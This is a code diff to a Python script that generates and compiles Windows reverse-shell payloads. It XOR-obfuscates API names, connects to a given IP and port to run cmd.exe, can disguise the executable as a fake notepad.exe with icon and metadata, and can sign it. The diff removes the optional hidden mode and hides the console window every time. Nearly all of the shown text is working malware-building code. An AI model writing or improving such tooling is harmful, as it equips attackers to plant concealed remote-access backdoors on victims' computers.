@@ -16,7 +16,7 @@ def encrypt_bytes(text):
 def xor_string(s, xor_key=0x55):
     return ''.join(f'\\x{ord(c) ^ xor_key:02x}' for c in s)
 
-def generate_payload_c(ip, cmd, port, notepad=False, hidden=False):
+def generate_payload_c(ip, cmd, port, notepad=False):
     ip_enc = encrypt_bytes(ip)
     cmd_enc = encrypt_bytes(cmd)
 
@@ -28,7 +28,7 @@ def generate_payload_c(ip, cmd, port, notepad=False, hidden=False):
     xconnect = xor_string("connect", xor_key)
     xCreateProcessA = xor_string("CreateProcessA", xor_key)
 
-    create_flags = "CREATE_NO_WINDOW" if hidden else "0"
+    create_flags = "CREATE_NO_WINDOW"
 
     with open("payload.c", "w") as f:
         f.write(f'''#include <winsock2.h>
@@ -173,7 +173,7 @@ END
 ''')
         print("[+] notepad.rc generated.")
 
-def compile_payload(notepad=False, keep=False, hidden=False, sign=False):
+def compile_payload(notepad=False, keep=False, sign=False):
     exe_name = "notepad.exe" if notepad else "payload.exe"
 
     try:
@@ -187,9 +187,7 @@ def compile_payload(notepad=False, keep=False, hidden=False, sign=False):
             subprocess.run(["x86_64-w64-mingw32-windres", "notepad.rc", "-O", "coff", "-o", "notepad.res"], check=True)
             cmd.append("notepad.res")
 
-        cmd += ["-o", exe_name, "-lws2_32"]
-        if hidden:
-            cmd.append("-mwindows")
+        cmd += ["-o", exe_name, "-lws2_32", "-mwindows"]
 
         print(f"[*] Compiling: {' '.join(cmd)}")
         subprocess.run(cmd, check=True)
@@ -220,7 +218,6 @@ if __name__ == "__main__":
     parser.add_argument("--cmd", default="cmd.exe", help="Command to execute (default: cmd.exe)")
     parser.add_argument("--notepad", action="store_true", help="Fake notepad with icon and metadata")
     parser.add_argument("--keep", action="store_true", help="Keep temporary files")
-    parser.add_argument("--hidden", action="store_true", help="Hide the console and cmd.exe")
     parser.add_argument("--sign", action="store_true", help="Sign the executable using sign_exe.py")
 
     args = parser.parse_args()
